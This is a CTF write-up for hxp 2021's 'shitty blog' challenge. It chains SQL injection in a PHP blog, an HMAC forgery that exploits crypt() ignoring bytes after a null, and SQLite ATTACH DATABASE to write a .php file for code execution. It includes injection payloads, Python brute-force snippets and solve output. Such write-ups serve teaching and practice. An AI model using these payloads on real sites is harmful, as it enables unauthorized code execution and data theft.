shitty blog ?  
=====

Points: 250 (31 solves)

Writeup by: ath0 and qxxxb

Challenge Author: 0xbb

Files: `shitty blog ?-a6c0b8b672817005.tar.xz`

Overview  
=====

The main logic of the challenges resides in one file, `index.php`.

There is a per-session SQLite database that gets created at  
`'/var/www/html/data/' . md5($salt.'|'.$id.'|'.$mac);`. In the session cookie,  
there is a user id (`$id`) and a HMAC which will be verified:

```php  
   $session = explode('|', $_COOKIE['session']);  
   if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true),
$salt), $salt.$session[1])) {  
       exit();  
   }  
   $id = $session[0];  
   $mac = $session[1];  
```

If we can forge a valid HMAC, we can move forward with a totally controlled
`$id` (more on the forgery later).

qxxxb noticed some interesting bits in the nginx config:

``` nginx  
location / {  
       try_files $uri $uri/ =404;  
}  
```

We can visit `http://localhost:8888/data/<sandbox_url>/blog.sqlite3` and we'll
be  
able to read our sqlite database back. But this doesn't help us achive our  
ultimate goal: We need to execute `/readflag` (neither nginx nor php have the  
ability to read `flag.txt` directly), so we need RCE. The other thing to note  
is nginx is setup to send any file ending in `.php` through the php
interpreter:

```nginx  
location ~ \.php$ {  
       include snippets/fastcgi-php.conf;  
       fastcgi_pass unix:/run/php/php7.4-fpm.sock;  
}  
```

So if we can write a `.php` file somewhere in `/var/www/html/`, we can just  
visit that URL and it will get executed! But how can we create such a file?

Luckily, there's another vulnerability which is likely the first thing you'll
notice when scanning `index.php`:

```php  
function delete_entry($db, $entry_id, $user_id) {  
   $db->exec("DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}");  
}  
```

SQL injection on `$user_id`! So if we can cram a SQL injection payload into  
`$user_id`, we can use any of the capabilities of SQLite.

Exploit  
=====

SQL injection to RCE  
----

Assuming we can control the user id (requires HMAC forgery, below), how will
we  
get code execution?

Some [cheat sheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet)
I found online shows you can create SQLite databases with arbitrary names:

```  
1';ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz
text); INSERT INTO lol.pwn (dataz) VALUES ('hax'); --  
```

And nginx is setup to send any file ending in .php through the php
interpreter:

```nginx  
location ~ \.php$ {  
       include snippets/fastcgi-php.conf;  
       fastcgi_pass unix:/run/php/php7.4-fpm.sock;  
}  
```

So our SQL injection payload just needs to create a file at
`/var/www/html/data/lol-abcdefg.php` containing `` anywhere within the file.

So the SQL injection payload we need (with quotes correctly encoded) is:

```  
'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE
lol.pwn (dataz test); INSERT INTO lol.pwn (dataz) VALUES (''); --  
```

(the `--` at the end starts a comment)

Forging a HMAC  
=====

Here is the relevant code from the `index.php`:

```php  
# Generating an HMAC  
$mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);

# Verifying an HMAC  
if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt),
$salt.$session[1])) {  
   exit();  
}  
```

The fourth `true` argument to `hash_hmac()` is for the parameter `binary`:  
> When set to true, outputs raw binary data. false outputs lowercase hexits.

However, the documentation for `crypt()` shows:  
> **Warning**: This function is not (yet) binary safe!

It turns out that `crypt()` considers its inputs as null-terminated strings.
As  
shown  
[here](https://www.reddit.com/r/PHP/comments/t0qzl/is_this_a_bug_shouldnt_crypt_be_binary_safe/),  
everything after the null byte is ignored:  
```php  
>>> assert(  
   crypt(b"\x00stuff", '$6$89bc41658a01fb6b$') ==  
   crypt(b"\x00ignored", '$6$89bc41658a01fb6b$')  
)  
=> true  
```

The first step is to find a `$mac` where  
`hash_hmac('md5', $id, $secret, true)` starts with a null byte.

The probability of this happening for a random `$id` is `1 / 256`. If it  
happens twice, we'll get two identical `$mac` values. Here's code to retrieve
the null MAC:

```python  
def get_null_mac():  
   mac_counter = set()  
   for i in tqdm(itertools.count()):  
       res = requests.get(URL_BASE)  
       id, mac = urllib.parse.unquote(res.cookies["session"]).split("|")  
       if mac in mac_counter:  
           return mac  
       mac_counter.add(mac)

   raise ValueError("Unreachable")  
```

Now that we have the null MAC, we can append junk at the end of our SQLi  
payload inside a comment and until its MAC matches our null MAC (`1 / 256`  
chance):

```python  
def attempt_sqli(junk: str, null_mac: str):  
   payload = (  
       "'test'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz test); INSERT INTO lol.pwn (dataz) VALUES (''); -- "  
       + junk  
   )  
   # ...  
```

Full solve script in `solve.py`.

```  
$ python3 solve.py  
[*] Looking for null MAC ...  
207it [01:15,  2.73it/s]  
[+] null_mac =
yC8z7vD9vdpSERKREHFfJ/PpyNg9yAXh00wZHnh8AlIehpWVmVxzrjphnbjrpiCr6Umu9D2l.CUSzAIlqQjLR/  
[*] Attempting SQLi ...  
post_id = 1  
hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}

37it [00:15,  2.44it/s]  
```  

Original writeup (https://github.com/cscosu/ctf-
writeups/tree/master/2021/hxp_ctf/shitty-blog).